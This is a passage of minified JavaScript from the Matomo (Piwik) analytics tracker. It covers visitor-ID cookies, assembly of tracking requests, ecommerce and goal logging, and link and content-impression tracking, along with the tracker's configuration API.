      function dj(dl) {
        if (!cO) {
          return "";
        }
        var dq = f(dl, av);
        if (!dq) {
          return "";
        }
        dq = String(dq);
        var dn = new RegExp("^[a-zA-Z0-9]+$");
        if (dq.length === 32 && dn.test(dq)) {
          var dm = dq.substr(16, 32);
          if (c4(dm)) {
            var dp = dq.substr(0, 16);
            return dp;
          }
        }
        return "";
      }
      function cP() {
        if (!bO) {
          bO = dj(bN);
        }
        var dn = new Date(),
          dl = Math.round(dn.getTime() / 1000),
          dm = aU("id"),
          dr = aD(dm),
          dq,
          dp;
        if (dr) {
          dq = dr.split(".");
          dq.unshift("0");
          if (bO.length) {
            dq[1] = bO;
          }
          return dq;
        }
        if (bO.length) {
          dp = bO;
        } else {
          if ("0" === b5()) {
            dp = "";
          } else {
            dp = cS();
          }
        }
        dq = ["1", dp, dl, 0, dl, "", ""];
        return dq;
      }
      function aZ() {
        var dt = cP(),
          dp = dt[0],
          dq = dt[1],
          dm = dt[2],
          dl = dt[3],
          dr = dt[4],
          dn = dt[5];
        if (!J(dt[6])) {
          dt[6] = "";
        }
        var ds = dt[6];
        return {
          newVisitor: dp,
          uuid: dq,
          createTs: dm,
          visitCount: dl,
          currentVisitTs: dr,
          lastVisitTs: dn,
          lastEcommerceOrderTs: ds
        };
      }
      function aH() {
        var dp = new Date(),
          dm = dp.getTime(),
          dq = aZ().createTs;
        var dl = parseInt(dq, 10);
        var dn = dl * 1000 + cK - dm;
        return dn;
      }
      function aM(dl) {
        if (!b6) {
          return;
        }
        var dn = new Date(),
          dm = Math.round(dn.getTime() / 1000);
        if (!J(dl)) {
          dl = aZ();
        }
        var dp = dl.uuid + "." + dl.createTs + "." + dl.visitCount + "." + dm + "." + dl.lastVisitTs + "." + dl.lastEcommerceOrderTs;
        dg(aU("id"), dp, aH(), bp, cZ, bS);
      }
      function bM() {
        var dl = aD(aU("ref"));
        if (dl.length) {
          try {
            dl = JSON_PIWIK.parse(dl);
            if (W(dl)) {
              return dl;
            }
          } catch (dm) {}
        }
        return ["", "", 0, ""];
      }
      function bw(dm) {
        var dl = "testvalue";
        dg("test", dl, 10000, null, dm);
        if (aD("test") === dl) {
          bY("test", null, dm);
          return true;
        }
        return false;
      }
      function aF() {
        var dm = bl;
        bl = false;
        var dl, dn;
        for (dl = 0; dl < bu.length; dl++) {
          dn = aU(bu[dl]);
          if (dn !== cN && dn !== be && 0 !== aD(dn)) {
            bY(dn, bp, cZ);
          }
        }
        bl = dm;
      }
      function b3(dl) {
        b6 = dl;
      }
      function dk(dq) {
        if (!dq || !W(dq)) {
          return;
        }
        var dp = [];
        var dn;
        for (dn in dq) {
          if (Object.prototype.hasOwnProperty.call(dq, dn)) {
            dp.push(dn);
          }
        }
        var dr = {};
        dp.sort();
        var dl = dp.length;
        var dm;
        for (dm = 0; dm < dl; dm++) {
          dr[dp[dm]] = dq[dp[dm]];
        }
        return dr;
      }
      function cd() {
        dg(aU("ses"), "1", cp, bp, cZ, bS);
      }
      function bh() {
        var dp = "";
        var dm = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        var dn = dm.length;
        var dl;
        for (dl = 0; dl < 6; dl++) {
          dp += dm.charAt(Math.floor(Math.random() * dn));
        }
        return dp;
      }
      function ct(dn, dJ, dK, dp) {
        var dI,
          dm = new Date(),
          dw = Math.round(dm.getTime() / 1000),
          dt,
          dH,
          dq = 1024,
          dQ,
          dx,
          dF = aR,
          dr = aU("ses"),
          dD = aU("ref"),
          dA = aU("cvar"),
          dB = aD(dr),
          dG = bM(),
          dM = a5 || bN,
          du,
          dl;
        if (bl) {
          aF();
        }
        if (cR) {
          return "";
        }
        var dC = aZ();
        if (!J(dp)) {
          dp = "";
        }
        var dz = G.characterSet || G.charset;
        if (!dz || dz.toLowerCase() === "utf-8") {
          dz = null;
        }
        du = dG[0];
        dl = dG[1];
        dt = dG[2];
        dH = dG[3];
        if (!dB) {
          var dL = cp / 1000;
          if (!dC.lastVisitTs || dw - dC.lastVisitTs > dL) {
            dC.visitCount++;
            dC.lastVisitTs = dC.currentVisitTs;
          }
          if (!bv || !du.length) {
            for (dI in cr) {
              if (Object.prototype.hasOwnProperty.call(cr, dI)) {
                du = f(dM, cr[dI]);
                if (du.length) {
                  break;
                }
              }
            }
            for (dI in bG) {
              if (Object.prototype.hasOwnProperty.call(bG, dI)) {
                dl = f(dM, bG[dI]);
                if (dl.length) {
                  break;
                }
              }
            }
          }
          dQ = d(bn);
          dx = dH.length ? d(dH) : "";
          if (dQ.length && !aW(dQ) && (!bv || !dx.length || aW(dx))) {
            dH = bn;
          }
          if (dH.length || du.length) {
            dt = dw;
            dG = [du, dl, dt, b2(dH.slice(0, dq))];
            dg(dD, JSON_PIWIK.stringify(dG), c7, bp, cZ);
          }
        }
        dn += "&idsite=" + b6 + "&rec=1&r=" + String(Math.random()).slice(2, 8) + "&h=" + dm.getHours() + "&m=" + dm.getMinutes() + "&s=" + dm.getSeconds() + "&url=" + t(b2(dM)) + (bn.length ? "&urlref=" + t(b2(bn)) : "") + (by && by.length ? "&uid=" + t(by) : "") + "&_id=" + dC.uuid + "&_idts=" + dC.createTs + "&_idvc=" + dC.visitCount + "&_idn=" + dC.newVisitor + (du.length ? "&_rcn=" + t(du) : "") + (dl.length ? "&_rck=" + t(dl) : "") + "&_refts=" + dt + "&_viewts=" + dC.lastVisitTs + (String(dC.lastEcommerceOrderTs).length ? "&_ects=" + dC.lastEcommerceOrderTs : "") + (String(dH).length ? "&_ref=" + t(b2(dH.slice(0, dq))) : "") + (dz ? "&cs=" + t(dz) : "") + "&send_image=0";
        var dP = cI();
        for (dI in dP) {
          if (Object.prototype.hasOwnProperty.call(dP, dI)) {
            dn += "&" + dI + "=" + dP[dI];
          }
        }
        var dO = [];
        if (dJ) {
          for (dI in dJ) {
            if (Object.prototype.hasOwnProperty.call(dJ, dI) && /^dimension\d+$/.test(dI)) {
              var ds = dI.replace("dimension", "");
              dO.push(parseInt(ds, 10));
              dO.push(String(ds));
              dn += "&" + dI + "=" + t(dJ[dI]);
              delete dJ[dI];
            }
          }
        }
        if (dJ && B(dJ)) {
          dJ = null;
        }
        for (dI in bm) {
          if (Object.prototype.hasOwnProperty.call(bm, dI)) {
            var dy = -1 === M(dO, dI);
            if (dy) {
              dn += "&dimension" + dI + "=" + t(bm[dI]);
            }
          }
        }
        if (dJ) {
          dn += "&data=" + t(JSON_PIWIK.stringify(dJ));
        } else {
          if (ao) {
            dn += "&data=" + t(JSON_PIWIK.stringify(ao));
          }
        }
        function dv(dR, dS) {
          var dT = JSON_PIWIK.stringify(dR);
          if (dT.length > 2) {
            return "&" + dS + "=" + t(dT);
          }
          return "";
        }
        var dN = dk(bW);
        var dE = dk(cm);
        dn += dv(dN, "cvar");
        dn += dv(dE, "e_cvar");
        if (aR) {
          dn += dv(aR, "_cvar");
          for (dI in dF) {
            if (Object.prototype.hasOwnProperty.call(dF, dI)) {
              if (aR[dI][0] === "" || aR[dI][1] === "") {
                delete aR[dI];
              }
            }
          }
          if (bQ) {
            dg(dA, JSON_PIWIK.stringify(aR), cp, bp, cZ);
          }
        }
        if (a3) {
          if (cn) {
            dn += "&gt_ms=" + cn;
          } else {
            if (i && i.timing && i.timing.requestStart && i.timing.responseEnd) {
              dn += "&gt_ms=" + (i.timing.responseEnd - i.timing.requestStart);
            }
          }
        }
        if (aL) {
          dn += "&pv_id=" + aL;
        }
        dC.lastEcommerceOrderTs = J(dp) && String(dp).length ? dp : dC.lastEcommerceOrderTs;
        aM(dC);
        cd();
        dn += ac(dK, {
          tracker: bI,
          request: dn
        });
        if (c1.length) {
          dn += "&" + c1;
        }
        if (A(cb)) {
          dn = cb(dn);
        }
        return dn;
      }
      bR = function a8() {
        var dl = new Date();
        dl = dl.getTime();
        if (!c0) {
          return false;
        }
        if (c0 + 1000 * c9 <= dl) {
          return false;
        }
        if (c0 + a6 <= dl) {
          bI.ping();
          return true;
        }
        return false;
      };
      function bq(dp, dn, du, dq, dl, dx) {
        var ds = "idgoal=0",
          dt,
          dm = new Date(),
          dv = [],
          dw,
          dr = String(dp).length;
        if (dr) {
          ds += "&ec_id=" + t(dp);
          dt = Math.round(dm.getTime() / 1000);
        }
        ds += "&revenue=" + dn;
        if (String(du).length) {
          ds += "&ec_st=" + du;
        }
        if (String(dq).length) {
          ds += "&ec_tx=" + dq;
        }
        if (String(dl).length) {
          ds += "&ec_sh=" + dl;
        }
        if (String(dx).length) {
          ds += "&ec_dt=" + dx;
        }
        if (c2) {
          for (dw in c2) {
            if (Object.prototype.hasOwnProperty.call(c2, dw)) {
              if (!J(c2[dw][1])) {
                c2[dw][1] = "";
              }
              if (!J(c2[dw][2])) {
                c2[dw][2] = "";
              }
              if (!J(c2[dw][3]) || String(c2[dw][3]).length === 0) {
                c2[dw][3] = 0;
              }
              if (!J(c2[dw][4]) || String(c2[dw][4]).length === 0) {
                c2[dw][4] = 1;
              }
              dv.push(c2[dw]);
            }
          }
          ds += "&ec_items=" + t(JSON_PIWIK.stringify(dv));
        }
        ds = ct(ds, ao, "ecommerce", dt);
        bF(ds, bJ);
        if (dr) {
          c2 = {};
        }
      }
      function bZ(dl, dq, dp, dn, dm, dr) {
        if (String(dl).length && J(dq)) {
          bq(dl, dq, dp, dn, dm, dr);
        }
      }
      function bs(dl) {
        if (J(dl)) {
          bq("", dl, "", "", "", "");
        }
      }
      function b0(dm, dp, dn) {
        aL = bh();
        var dl = ct("action_name=" + t(al(dm || bj)), dp, "log");
        bF(dl, bJ, dn);
      }
      function a1(dn, dm) {
        var dp,
          dl = "(^| )(piwik[_-]" + dm + "|matomo[_-]" + dm;
        if (dn) {
          for (dp = 0; dp < dn.length; dp++) {
            dl += "|" + dn[dp];
          }
        }
        dl += ")( |$)";
        return new RegExp(dl);
      }
      function aV(dl) {
        return aE && dl && 0 === String(dl).indexOf(aE);
      }
      function cv(dq, dl, dr, dm) {
        if (aV(dl)) {
          return 0;
        }
        var dp = a1(bL, "download"),
          dn = a1(a9, "link"),
          ds = new RegExp("\\.(" + c8.join("|") + ")([?&#]|$)", "i");
        if (dn.test(dq)) {
          return "link";
        }
        if (dm || dp.test(dq) || ds.test(dl)) {
          return "download";
        }
        if (dr) {
          return 0;
        }
        return "link";
      }
      function au(dm) {
        var dl;
        dl = dm.parentNode;
        while (dl !== null && J(dl)) {
          if (ae.isLinkElement(dm)) {
            break;
          }
          dm = dl;
          dl = dm.parentNode;
        }
        return dm;
      }
      function de(dr) {
        dr = au(dr);
        if (!ae.hasNodeAttribute(dr, "href")) {
          return;
        }
        if (!J(dr.href)) {
          return;
        }
        var dq = ae.getAttributeValueFromNode(dr, "href");
        if (aV(dq)) {
          return;
        }
        var dm = dr.pathname || cl(dr.href);
        var ds = dr.hostname || d(dr.href);
        var dt = ds.toLowerCase();
        var dn = dr.href.replace(ds, dt);
        var dp = new RegExp("^(javascript|vbscript|jscript|mocha|livescript|ecmascript|mailto|tel):", "i");
        if (!dp.test(dn)) {
          var dl = cv(dr.className, dn, ar(dt, dm), ae.hasNodeAttribute(dr, "download"));
          if (dl) {
            return {
              type: dl,
              href: dn
            };
          }
        }
      }
      function aQ(dl, dm, dn, dp) {
        var dq = v.buildInteractionRequestParams(dl, dm, dn, dp);
        if (!dq) {
          return;
        }
        return ct(dq, null, "contentInteraction");
      }
      function cM(dn, dp, dt, dl, dm) {
        if (!J(dn)) {
          return;
        }
        if (aV(dn)) {
          return dn;
        }
        var dr = v.toAbsoluteUrl(dn);
        var dq = "redirecturl=" + t(dr) + "&";
        dq += aQ(dp, dt, dl, dm || dn);
        var ds = "&";
        if (aE.indexOf("?") < 0) {
          ds = "?";
        }
        return aE + ds + dq;
      }
      function bc(dl, dm) {
        if (!dl || !dm) {
          return false;
        }
        var dn = v.findTargetNode(dl);
        if (v.shouldIgnoreInteraction(dn)) {
          return false;
        }
        dn = v.findTargetNodeNoDefault(dl);
        if (dn && !V(dn, dm)) {
          return false;
        }
        return true;
      }
      function cu(dn, dm, dq) {
        if (!dn) {
          return;
        }
        var dl = v.findParentContentNode(dn);
        if (!dl) {
          return;
        }
        if (!bc(dl, dn)) {
          return;
        }
        var dp = v.buildContentBlock(dl);
        if (!dp) {
          return;
        }
        if (!dp.target && dq) {
          dp.target = dq;
        }
        return v.buildInteractionRequestParams(dm, dp.name, dp.piece, dp.target);
      }
      function aX(dm) {
        if (!ca || !ca.length) {
          return false;
        }
        var dl, dn;
        for (dl = 0; dl < ca.length; dl++) {
          dn = ca[dl];
          if (dn && dn.name === dm.name && dn.piece === dm.piece && dn.target === dm.target) {
            return true;
          }
        }
        return false;
      }
      function bE(dp) {
        if (!dp) {
          return false;
        }
        var ds = v.findTargetNode(dp);
        if (!ds || v.shouldIgnoreInteraction(ds)) {
          return false;
        }
        var dt = de(ds);
        if (db && dt && dt.type) {
          return false;
        }
        if (ae.isLinkElement(ds) && ae.hasNodeAttributeWithValue(ds, "href")) {
          var dl = String(ae.getAttributeValueFromNode(ds, "href"));
          if (0 === dl.indexOf("#")) {
            return false;
          }
          if (aV(dl)) {
            return true;
          }
          if (!v.isUrlToCurrentDomain(dl)) {
            return false;
          }
          var dq = v.buildContentBlock(dp);
          if (!dq) {
            return;
          }
          var dn = dq.name;
          var du = dq.piece;
          var dr = dq.target;
          if (!ae.hasNodeAttributeWithValue(ds, v.CONTENT_TARGET_ATTR) || ds.wasContentTargetAttrReplaced) {
            ds.wasContentTargetAttrReplaced = true;
            dr = v.toAbsoluteUrl(dl);
            ae.setAnyAttribute(ds, v.CONTENT_TARGET_ATTR, dr);
          }
          var dm = cM(dl, "click", dn, du, dr);
          v.setHrefAttribute(ds, dm);
          return true;
        }
        return false;
      }
      function aN(dm) {
        if (!dm || !dm.length) {
          return;
        }
        var dl;
        for (dl = 0; dl < dm.length; dl++) {
          bE(dm[dl]);
        }
      }
      function aY(dl) {
        return function (dm) {
          if (!dl) {
            return;
          }
          var dq = v.findParentContentNode(dl);
          var dr;
          if (dm) {
            dr = dm.target || dm.srcElement;
          }
          if (!dr) {
            dr = dl;
          }
          if (!bc(dq, dr)) {
            return;
          }
          cg(bJ);
          if (ae.isLinkElement(dl) && ae.hasNodeAttributeWithValue(dl, "href") && ae.hasNodeAttributeWithValue(dl, v.CONTENT_TARGET_ATTR)) {
            var dn = ae.getAttributeValueFromNode(dl, "href");
            if (!aV(dn) && dl.wasContentTargetAttrReplaced) {
              ae.setAnyAttribute(dl, v.CONTENT_TARGET_ATTR, "");
            }
          }
          var dv = de(dl);
          if (ap && dv && dv.type) {
            return dv.type;
          }
          if (bE(dq)) {
            return "href";
          }
          var ds = v.buildContentBlock(dq);
          if (!ds) {
            return;
          }
          var dp = ds.name;
          var dw = ds.piece;
          var du = ds.target;
          var dt = aQ("click", dp, dw, du);
          if (dt) {
            bF(dt, bJ);
          }
          return dt;
        };
      }
      function b1(dn) {
        if (!dn || !dn.length) {
          return;
        }
        var dl, dm;
        for (dl = 0; dl < dn.length; dl++) {
          dm = v.findTargetNode(dn[dl]);
          if (dm && !dm.contentInteractionTrackingSetupDone) {
            dm.contentInteractionTrackingSetupDone = true;
            an(dm, "click", aY(dm));
          }
        }
      }
      function bx(dn, dp) {
        if (!dn || !dn.length) {
          return [];
        }
        var dl, dm;
        for (dl = 0; dl < dn.length; dl++) {
          if (aX(dn[dl])) {
            dn.splice(dl, 1);
            dl--;
          } else {
            ca.push(dn[dl]);
          }
        }
        if (!dn || !dn.length) {
          return [];
        }
        aN(dp);
        b1(dp);
        var dq = [];
        for (dl = 0; dl < dn.length; dl++) {
          dm = ct(v.buildImpressionRequestParams(dn[dl].name, dn[dl].piece, dn[dl].target), undefined, "contentImpressions");
          if (dm) {
            dq.push(dm);
          }
        }
        return dq;
      }
      function cz(dm) {
        var dl = v.collectContent(dm);
        return bx(dl, dm);
      }
      function ba(dm) {
        if (!dm || !dm.length) {
          return [];
        }
        var dl;
        for (dl = 0; dl < dm.length; dl++) {
          if (!v.isNodeVisible(dm[dl])) {
            dm.splice(dl, 1);
            dl--;
          }
        }
        if (!dm || !dm.length) {
          return [];
        }
        return cz(dm);
      }
      function aG(dn, dl, dm) {
        var dp = v.buildImpressionRequestParams(dn, dl, dm);
        return ct(dp, null, "contentImpression");
      }
      function dd(dp, dm) {
        if (!dp) {
          return;
        }
        var dl = v.findParentContentNode(dp);
        var dn = v.buildContentBlock(dl);
        if (!dn) {
          return;
        }
        if (!dm) {
          dm = "Unknown";
        }
        return aQ(dm, dn.name, dn.piece, dn.target);
      }
      function cQ(dm, dp, dl, dn) {
        return "e_c=" + t(dm) + "&e_a=" + t(dp) + (J(dl) ? "&e_n=" + t(dl) : "") + (J(dn) ? "&e_v=" + t(dn) : "");
      }
      function at(dn, dq, dl, dp, ds, dr) {
        if (a(String(dn)).length === 0 || a(String(dq)).length === 0) {
          ak("Error while logging event: Parameters `category` and `action` must not be empty or filled with whitespaces");
          return false;
        }
        var dm = ct(cQ(dn, dq, dl, dp), ds, "event");
        bF(dm, bJ, dr);
      }
      function b8(dl, dp, dm, dq) {
        var dn = ct("search=" + t(dl) + (dp ? "&search_cat=" + t(dp) : "") + (J(dm) ? "&search_count=" + dm : ""), dq, "sitesearch");
        bF(dn, bJ);
      }
      function cV(dl, dq, dp, dn) {
        var dm = ct("idgoal=" + dl + (dq ? "&revenue=" + dq : ""), dp, "goal");
        bF(dm, bJ, dn);
      }
      function c3(dp, dl, dt, ds, dn) {
        var dr = dl + "=" + t(b2(dp));
        var dm = cu(dn, "click", dp);
        if (dm) {
          dr += "&" + dm;
        }
        var dq = ct(dr, dt, "link");
        bF(dq, bJ, ds);
      }
      function bU(dm, dl) {
        if (dm !== "") {
          return dm + dl.charAt(0).toUpperCase() + dl.slice(1);
        }
        return dl;
      }
      function ch(dr) {
        var dq,
          dl,
          dp = ["", "webkit", "ms", "moz"],
          dn;
        if (!bf) {
          for (dl = 0; dl < dp.length; dl++) {
            dn = dp[dl];
            if (Object.prototype.hasOwnProperty.call(G, bU(dn, "hidden"))) {
              if (G[bU(dn, "visibilityState")] === "prerender") {
                dq = true;
              }
              break;
            }
          }
        }
        if (dq) {
          an(G, dn + "visibilitychange", function dm() {
            G.removeEventListener(dn + "visibilitychange", dm, false);
            dr();
          });
          return;
        }
        dr();
      }
      function br() {
        var dm = aZ().uuid;
        var dl = aJ();
        return dm + dl;
      }
      function cj(dl) {
        if (!dl) {
          return;
        }
        if (!ae.hasNodeAttribute(dl, "href")) {
          return;
        }
        var dm = ae.getAttributeValueFromNode(dl, "href");
        if (!dm || aV(dm)) {
          return;
        }
        dm = k(dm, av);
        var dn = br();
        dm = F(dm, av, dn);
        ae.setAnyAttribute(dl, "href", dm);
      }
      function aB(dp) {
        var dq = ae.getAttributeValueFromNode(dp, "href");
        if (!dq) {
          return false;
        }
        dq = String(dq);
        var dm = dq.indexOf("//") === 0 || dq.indexOf("http://") === 0 || dq.indexOf("https://") === 0;
        if (!dm) {
          return false;
        }
        var dl = dp.pathname || cl(dp.href);
        var dn = (dp.hostname || d(dp.href)).toLowerCase();
        if (ar(dn, dl)) {
          if (!cH(cW, L(dn))) {
            return true;
          }
          return false;
        }
        return false;
      }
      function cG(dl) {
        var dm = de(dl);
        if (dm && dm.type) {
          dm.href = p(dm.href);
          c3(dm.href, dm.type, undefined, null, dl);
          return;
        }
        if (cO) {
          dl = au(dl);
          if (aB(dl)) {
            cj(dl);
          }
        }
      }
      function cw() {
        return G.all && !G.addEventListener;
      }
      function cX(dl) {
        var dn = dl.which;
        var dm = typeof dl.button;
        if (!dn && dm !== "undefined") {
          if (cw()) {
            if (dl.button & 1) {
              dn = 1;
            } else {
              if (dl.button & 2) {
                dn = 3;
              } else {
                if (dl.button & 4) {
                  dn = 2;
                }
              }
            }
          } else {
            if (dl.button === 0 || dl.button === "0") {
              dn = 1;
            } else {
              if (dl.button & 1) {
                dn = 2;
              } else {
                if (dl.button & 2) {
                  dn = 3;
                }
              }
            }
          }
        }
        return dn;
      }
      function bT(dl) {
        switch (cX(dl)) {
          case 1:
            return "left";
          case 2:
            return "middle";
          case 3:
            return "right";
        }
      }
      function a2(dl) {
        return dl.target || dl.srcElement;
      }
      function aC(dl) {
        return function (dp) {
          dp = dp || T.event;
          var dn = bT(dp);
          var dq = a2(dp);
          if (dp.type === "click") {
            var dm = false;
            if (dl && dn === "middle") {
              dm = true;
            }
            if (dq && !dm) {
              cG(dq);
            }
          } else {
            if (dp.type === "mousedown") {
              if (dn === "middle" && dq) {
                aS = dn;
                bA = dq;
              } else {
                aS = bA = null;
              }
            } else {
              if (dp.type === "mouseup") {
                if (dn === aS && dq === bA) {
                  cG(dq);
                }
                aS = bA = null;
              } else {
                if (dp.type === "contextmenu") {
                  cG(dq);
                }
              }
            }
          }
        };
      }
      function aq(dn, dm) {
        var dl = typeof dm;
        if (dl === "undefined") {
          dm = true;
        }
        an(dn, "click", aC(dm), false);
        if (dm) {
          an(dn, "mouseup", aC(dm), false);
          an(dn, "mousedown", aC(dm), false);
          an(dn, "contextmenu", aC(dm), false);
        }
      }
      function bD(dn, dq) {
        ap = true;
        var dp,
          dm = a1(bz, "ignore"),
          dr = G.links,
          dl = null,
          ds = null;
        if (dr) {
          for (dp = 0; dp < dr.length; dp++) {
            dl = dr[dp];
            if (!dm.test(dl.className)) {
              ds = typeof dl.piwikTrackers;
              if ("undefined" === ds) {
                dl.piwikTrackers = [];
              }
              if (-1 === M(dl.piwikTrackers, dq)) {
                dl.piwikTrackers.push(dq);
                aq(dl, dn);
              }
            }
          }
        }
      }
      function aT(dm, dq, dr) {
        if (cf) {
          return true;
        }
        cf = true;
        var ds = false;
        var dp, dn;
        function dl() {
          ds = true;
        }
        n(function () {
          function dt(dv) {
            setTimeout(function () {
              if (!cf) {
                return;
              }
              ds = false;
              dr.trackVisibleContentImpressions();
              dt(dv);
            }, dv);
          }
          function du(dv) {
            setTimeout(function () {
              if (!cf) {
                return;
              }
              if (ds) {
                ds = false;
                dr.trackVisibleContentImpressions();
              }
              du(dv);
            }, dv);
          }
          if (dm) {
            dp = ["scroll", "resize"];
            for (dn = 0; dn < dp.length; dn++) {
              if (G.addEventListener) {
                G.addEventListener(dp[dn], dl, false);
              } else {
                T.attachEvent("on" + dp[dn], dl);
              }
            }
            du(100);
          }
          if (dq && dq > 0) {
            dq = parseInt(dq, 10);
            dt(dq);
          }
        });
      }
      var bC = {
        enabled: true,
        requests: [],
        timeout: null,
        interval: 2500,
        sendRequests: function () {
          var dl = this.requests;
          this.requests = [];
          if (dl.length === 1) {
            bF(dl[0], bJ);
          } else {
            dh(dl, bJ);
          }
        },
        canQueue: function () {
          return !m && this.enabled;
        },
        pushMultiple: function (dm) {
          if (!this.canQueue()) {
            dh(dm, bJ);
            return;
          }
          var dl;
          for (dl = 0; dl < dm.length; dl++) {
            this.push(dm[dl]);
          }
        },
        push: function (dl) {
          if (!dl) {
            return;
          }
          if (!this.canQueue()) {
            bF(dl, bJ);
            return;
          }
          bC.requests.push(dl);
          if (this.timeout) {
            clearTimeout(this.timeout);
            this.timeout = null;
          }
          this.timeout = setTimeout(function () {
            bC.timeout = null;
            bC.sendRequests();
          }, bC.interval);
          var dm = "RequestQueue" + ax;
          if (!Object.prototype.hasOwnProperty.call(b, dm)) {
            b[dm] = {
              unload: function () {
                if (bC.timeout) {
                  clearTimeout(bC.timeout);
                }
                bC.sendRequests();
              }
            };
          }
        }
      };
      bi();
      aM();
      this.hasConsent = function () {
        return bB;
      };
      this.getVisitorId = function () {
        return aZ().uuid;
      };
      this.getVisitorInfo = function () {
        return cP();
      };
      this.getAttributionInfo = function () {
        return bM();
      };
      this.getAttributionCampaignName = function () {
        return bM()[0];
      };
      this.getAttributionCampaignKeyword = function () {
        return bM()[1];
      };
      this.getAttributionReferrerTimestamp = function () {
        return bM()[2];
      };
      this.getAttributionReferrerUrl = function () {
        return bM()[3];
      };
      this.setTrackerUrl = function (dl) {
        aE = dl;
      };
      this.getTrackerUrl = function () {
        return aE;
      };
      this.getPiwikUrl = function () {
        return O(this.getTrackerUrl(), bH);
      };
      this.addTracker = function (dl, dn) {
        if (!J(dl) || null === dl) {
          dl = this.getTrackerUrl();
        }
        var dm = new Q(dl, dn);
        I.push(dm);
        e.trigger("TrackerAdded", [this]);
        return dm;
      };
      this.getSiteId = function () {
        return b6;
      };
      this.setSiteId = function (dl) {
        b3(dl);
      };
      this.resetUserId = function () {
        by = "";
      };
      this.setUserId = function (dl) {
        if (Y(dl)) {
          by = dl;
        }
      };
      this.setVisitorId = function (dm) {
        var dl = /[0-9A-Fa-f]{16}/g;
        if (w(dm) && dl.test(dm)) {
          bO = dm;
        } else {
          ak("Invalid visitorId set" + dm);
        }
      };
      this.getUserId = function () {
        return by;
      };
      this.setCustomData = function (dl, dm) {
        if (W(dl)) {
          ao = dl;
        } else {
          if (!ao) {
            ao = {};
          }
          ao[dl] = dm;
        }
      };
      this.getCustomData = function () {
        return ao;
      };
      this.setCustomRequestProcessing = function (dl) {
        cb = dl;
      };
      this.appendToTrackingUrl = function (dl) {
        c1 = dl;
      };
      this.getRequest = function (dl) {
        return ct(dl);
      };
      this.addPlugin = function (dl, dm) {
        b[dl] = dm;
      };
      this.setCustomDimension = function (dl, dm) {
        dl = parseInt(dl, 10);
        if (dl > 0) {
          if (!J(dm)) {
            dm = "";
          }
          if (!w(dm)) {
            dm = String(dm);
          }
          bm[dl] = dm;
        }
      };
      this.getCustomDimension = function (dl) {
        dl = parseInt(dl, 10);
        if (dl > 0 && Object.prototype.hasOwnProperty.call(bm, dl)) {
          return bm[dl];
        }
      };
      this.deleteCustomDimension = function (dl) {
        dl = parseInt(dl, 10);
        if (dl > 0) {
          delete bm[dl];
        }
      };
      this.setCustomVariable = function (dm, dl, dq, dn) {
        var dp;
        if (!J(dn)) {
          dn = "visit";
        }
        if (!J(dl)) {
          return;
        }
        if (!J(dq)) {
          dq = "";
        }
        if (dm > 0) {
          dl = !w(dl) ? String(dl) : dl;
          dq = !w(dq) ? String(dq) : dq;
          dp = [dl.slice(0, bt), dq.slice(0, bt)];
          if (dn === "visit" || dn === 2) {
            cF();
            aR[dm] = dp;
          } else {
            if (dn === "page" || dn === 3) {
              bW[dm] = dp;
            } else {
              if (dn === "event") {
                cm[dm] = dp;
              }
            }
          }
        }
      };
      this.getCustomVariable = function (dm, dn) {
        var dl;
        if (!J(dn)) {
          dn = "visit";
        }
        if (dn === "page" || dn === 3) {
          dl = bW[dm];
        } else {
          if (dn === "event") {
            dl = cm[dm];
          } else {
            if (dn === "visit" || dn === 2) {
              cF();
              dl = aR[dm];
            }
          }
        }
        if (!J(dl) || dl && dl[0] === "") {
          return false;
        }
        return dl;
      };
      this.deleteCustomVariable = function (dl, dm) {
        if (this.getCustomVariable(dl, dm)) {
          this.setCustomVariable(dl, "", "", dm);
        }
      };
      this.deleteCustomVariables = function (dl) {
        if (dl === "page" || dl === 3) {
          bW = {};
        } else {
          if (dl === "event") {
            cm = {};
          } else {
            if (dl === "visit" || dl === 2) {
              aR = {};
            }
          }
        }
      };
      this.storeCustomVariablesInCookie = function () {
        bQ = true;
      };
      this.setLinkTrackingTimer = function (dl) {
        bJ = dl;
      };
      this.getLinkTrackingTimer = function () {
        return bJ;
      };
      this.setDownloadExtensions = function (dl) {
        if (w(dl)) {
          dl = dl.split("|");
        }
        c8 = dl;
      };
      this.addDownloadExtensions = function (dm) {
        var dl;
        if (w(dm)) {
          dm = dm.split("|");
        }
        for (dl = 0; dl < dm.length; dl++) {
          c8.push(dm[dl]);
        }
      };
      this.removeDownloadExtensions = function (dn) {
        var dm,
          dl = [];
        if (w(dn)) {
          dn = dn.split("|");
        }
        for (dm = 0; dm < c8.length; dm++) {
          if (M(dn, c8[dm]) === -1) {
            dl.push(c8[dm]);
          }
        }
        c8 = dl;
      };
      this.setDomains = function (dl) {
        ay = w(dl) ? [dl] : dl;
        var dq = false,
          dn = 0,
          dm;
        for (dn; dn < ay.length; dn++) {
          dm = String(ay[dn]);
          if (cH(cW, L(dm))) {
            dq = true;
            break;
          }
          var dp = cl(dm);
          if (dp && dp !== "/" && dp !== "/*") {
            dq = true;
            break;
          }
        }
        if (!dq) {
          ay.push(cW);
        }
      };
      this.enableCrossDomainLinking = function () {
        cO = true;
      };
      this.disableCrossDomainLinking = function () {
        cO = false;
      };
      this.isCrossDomainLinkingEnabled = function () {
        return cO;
      };
      this.setCrossDomainLinkingTimeout = function (dl) {
        a0 = dl;
      };
      this.getCrossDomainLinkingUrlParameter = function () {
        return t(av) + "=" + t(br());
      };
      this.setIgnoreClasses = function (dl) {
        bz = w(dl) ? [dl] : dl;
      };
      this.setRequestMethod = function (dl) {
        dc = dl || ci;
      };
      this.setRequestContentType = function (dl) {
        cx = dl || aI;
      };
      this.setReferrerUrl = function (dl) {
        bn = dl;
      };
      this.setCustomUrl = function (dl) {
        a5 = bV(bN, dl);
      };
      this.getCurrentUrl = function () {
        return a5 || bN;
      };
      this.setDocumentTitle = function (dl) {
        bj = dl;
      };
      this.setAPIUrl = function (dl) {
        bH = dl;
      };
      this.setDownloadClasses = function (dl) {
        bL = w(dl) ? [dl] : dl;
      };
      this.setLinkClasses = function (dl) {
        a9 = w(dl) ? [dl] : dl;
      };
      this.setCampaignNameKey = function (dl) {
        cr = w(dl) ? [dl] : dl;
      };
      this.setCampaignKeywordKey = function (dl) {
        bG = w(dl) ? [dl] : dl;
      };
      this.discardHashTag = function (dl) {
        bP = dl;
      };
      this.setCookieNamePrefix = function (dl) {
        bk = dl;
        aR = bX();
      };
      this.setCookieDomain = function (dl) {
        var dm = L(dl);
        if (bw(dm)) {
          cZ = dm;
          bi();
        }
      };
